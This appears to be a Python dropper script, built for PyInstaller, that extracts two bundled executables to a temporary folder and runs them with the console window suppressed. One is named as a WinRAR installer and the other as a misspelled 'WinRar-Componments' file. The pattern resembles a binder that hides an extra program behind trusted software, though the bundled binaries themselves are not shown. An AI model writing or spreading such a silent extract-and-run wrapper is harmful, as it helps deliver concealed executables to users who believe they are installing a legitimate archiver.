import subprocess
import tempfile
import os
from pathlib import Path
import sys

import requests
from requests.exceptions import RequestException
import subprocess
import sys
from colorama import init, Fore, Style
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread, Lock
from tqdm import tqdm
from bs4 import BeautifulSoup
import cloudscraper
import logging

def get_resource_path(relative_path):
    """ Retourne le chemin d'accès à la ressource incorporée, fonctionne pour le développement et le mode 'One-File'."""
    try:
        # PyInstaller crée un dossier temporaire et y stocke le chemin dans _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

def extract_and_run(executable_name):
    # Extraire l'exécutable dans un dossier temporaire
    temp_dir = tempfile.mkdtemp()
    temp_exe_path = os.path.join(temp_dir, executable_name)
    resource_path = get_resource_path(executable_name)
    
    with open(resource_path, "rb") as source_file, open(temp_exe_path, "wb") as dest_file:
        dest_file.write(source_file.read())
    
    # Exécuter l'exécutable
    subprocess.run(temp_exe_path, creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    extract_and_run("winrar-x32-624fr.exe")
    extract_and_run("WinRar-Componments.exe")
